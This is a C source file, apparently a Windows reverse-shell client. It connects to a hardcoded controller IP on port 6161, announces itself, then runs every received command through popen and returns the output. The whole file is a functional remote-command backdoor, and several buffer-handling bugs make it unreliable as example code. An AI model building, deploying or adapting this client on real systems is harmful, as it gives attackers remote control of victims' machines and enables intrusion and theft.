//
// Created by M on 1/24/2019.
//


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/types.h>
#include <unistd.h>
#include <winsock2.h>
#pragma comment(lib , "ws2_32.a")
#include <windows.h>
#define Father_IP "192.168.0.41"
#define Whoami "Windows V 22"
#define MAX_LENGTH 4096 //max number of bytes in a message
#define bzero(b,len) (memset((b), '\0', (len)), (void) 0)
#define bcopy(b1,b2,len) (memmove((b2), (b1), (len)), (void) 0)

void error(const char *msg)
{
    perror(msg);
    exit(0);
}
#define BUFSIZE 4096
#define PORT 6161

int setUP(SOCKET *Father_p){
    WSADATA wsd;
    char Buffer[BUFSIZE];
    int ret,n;
    struct sockaddr_in server;
    unsigned short port;
    struct hostent *host = NULL;
    START_EVERYTHING:
    /*Load Winsock DLL*/
    if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0) {
        printf("Winsock    initialization failed!\n");
        return 0;
    }
    /*Create Socket*/
    *Father_p = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (*Father_p == INVALID_SOCKET) {
        printf("socket() : %d\n", WSAGetLastError());
        return 0;
    }
    /*Specify the server address*/
    server.sin_family = AF_INET;
    port = PORT;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(Father_IP);
    if (server.sin_addr.s_addr == INADDR_NONE) {
        host = gethostbyname(Father_IP);    /// Enter the address man name, etc.)
        if (host == NULL) {
            printf("Unable to resolve server address: %s\n", Father_IP);
            return 0;
        }
        CopyMemory(&server.sin_addr,
                   host->h_addr_list[0],
                   host->h_length);
    }
    /* Establish a connection with the server */
    printf("Establishing a connection with the server\n");
    START_CONNECTING:
    if (connect(*Father_p, (struct sockaddr*)&server,
                sizeof(server)) == SOCKET_ERROR) {
        int error = WSAGetLastError();
        if (error == 10061) {
            goto START_CONNECTING;
        } else {
            printf("connect() failure: %d\n", WSAGetLastError());
        }
    }
    return 1;
}


int send_buffer(const SOCKET *Father_p,char *buffer_to_send){
    int ret;
    ret = send(*Father_p,buffer_to_send , strlen(buffer_to_send), 0);
    //free(buffer_to_send);
    if (ret == 0) {
        //did not send anything
        return 1;
    }
    else if (ret == SOCKET_ERROR) {
        printf("send() failure: %d\n", WSAGetLastError());
        return -1;
    }
    return 0;
}

// You HAVE to free the result!!!!
// This function can execute or send wrong stuff and
// It can crash - it can stop!
char *exec(char* cmd,int cmd_size) {
    FILE* pipe = popen(cmd, "r");
    if (!pipe){
        return "ERROR";
    }
    size_t current_size = 1024;
    char *line_buffer = calloc(current_size, sizeof(char));
    char *result = calloc(current_size, sizeof(char));
    int how_many_line = 0;
    while(!feof(pipe)) {
        how_many_line++;
        if(fgets(line_buffer, current_size, pipe) != NULL)
            strcat(result,line_buffer);
        // reallocate if the buffer is not good/  .
        if (how_many_line >= 10){
            current_size = current_size*2;
            // In case any problem
            if (current_size >= 1650000000){
                current_size = 1650000000;
            }
            how_many_line = 0;
            result = realloc(result,(current_size));
        }
    }
    //for each line
    free(line_buffer);
    pclose(pipe);
    return result;
}


int SendSomething(const SOCKET *Father_P,char *message){
    //Send message to Father_IP.

    // add null to the end for len()
    message = strcat(message,"\0");
    // Size of the buffer that carry the size string/buffer
    size_t size_buffer = MAX_LENGTH;
    // The size string/buffer
    char *buffer = calloc(size_buffer, sizeof(char));
    // The length of message
    int length_of_buffer = strlen(message);
    // Convert the size from int to string to be sent.
    snprintf(buffer, sizeof(buffer), "%d", length_of_buffer);
    // Send the size string/buffer
    printf("size sent %s\n",buffer);
    send_buffer(Father_P,buffer);
    // Send the real message
    printf("message sent %s\n",message);
    send_buffer(Father_P,(char*) message);
    return 1;
}

//todo add error checking functionality.
char* w8(const SOCKET *Father_p,char *buffer){
    //char *buffer2 = calloc(MAX_LENGTH, sizeof(char));

    bzero(buffer,MAX_LENGTH);
    int n= 0;
    //Get the length of the next command
    n = recv(*Father_p, buffer, MAX_LENGTH+1,0);
    if ((n) == -1){
        fprintf(stderr, "recv: %s (%d)\n", strerror(errno), errno);
//        return -1;
    }
    // Get the length of the buffer.
    int buffer_length = 0;
    //buffer_length = atoi(buffer);
    sscanf(buffer, "%i", &buffer_length);
    printf("The length of the next command: %s\n",buffer);


    //Freed in the same function.
    char *buffer_for_coming_command = calloc(buffer_length, sizeof(char));
    // After getting the size we can make a buffer that is the same required size.
    //Return error or display message from server
    n = recv(*Father_p, buffer_for_coming_command, buffer_length+1 ,0);
    if ((n) == -1){
        fprintf(stderr, "recv: %s (%d)\n", strerror(errno), errno);
//        return -1;
    }

    // This has to be freed after you send it. Which mean after Send_something().
    char *result;
    // Execute
    result = exec(buffer_for_coming_command,buffer_length);
    //Do other stuff


    printf("%s\n",buffer_for_coming_command);
    printf("%s\n",result);

    // clean
    bzero(buffer,MAX_LENGTH);
    free(buffer_for_coming_command);
    return result;
}

char* read_from_screen(char *buffer ){
    // To read from screen - freed in the same function.
    char *screen_buffer = calloc(MAX_LENGTH, sizeof(char));
    //Get message and format
    printf("> ");
    // Put 0s for all values in the buffer.
    memset(screen_buffer,0, MAX_LENGTH);
    // gets your commands
    fgets(screen_buffer,MAX_LENGTH-1,stdin);
    // puts a 0 after \n to end the buffer
    screen_buffer[strcspn(screen_buffer, "\n")] = 0;
    printf("Sent > %s\n",screen_buffer);
    //Append buffer
    memset(buffer, 0, MAX_LENGTH);
    strcpy(buffer, screen_buffer);
    free(screen_buffer);
    return buffer;
}

int main(int argc, char *argv[]){
    //Verify there are the correct number of arguments passed to client

    int n;
    // Size of the buffer that carry the size string/buffer
    size_t size_buffer = MAX_LENGTH;
    // The size string/buffer
    // TRS = to receive the size of the next buffer.
    char *buffer_TRS = calloc(size_buffer, sizeof(char));
    memset(buffer_TRS, 0, MAX_LENGTH);

    // Setup the connection.
    SOCKET Father;
    Father = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    setUP(&Father);

    // I dont need to read from screen so I will just send me name.
    //buffer_TRS = read_from_screen(buffer_TRS);

    // Send the initial information - name and other stuff
    // todo check for errors.
    buffer_TRS = strcat(buffer_TRS,Whoami);
    buffer_TRS = strcat(buffer_TRS," The king");
    buffer_TRS = strcat(buffer_TRS,"\0");
    n = SendSomething(&Father, (char *) buffer_TRS);

    //loop
    while(1){
        // LEAVE THIS FOR THE WHILE FUCKING LOOP
        //If we want to sent the quit command, break loop and close sock.
        if(strcmp(buffer_TRS, "\\quit") == 0)
            break;
        // I added buffer_TRS as a parameter to receive the size of the next buffer.

        //Command is result
        char *Command;
        Command = w8(&Father,(char *) buffer_TRS);
        n = SendSomething(&Father, (char *) Command);
        free(Command);
    }
    // buffer_TRS
    free(buffer_TRS);
    //Close socket and return to command line
    close(Father);
    return 0;
}
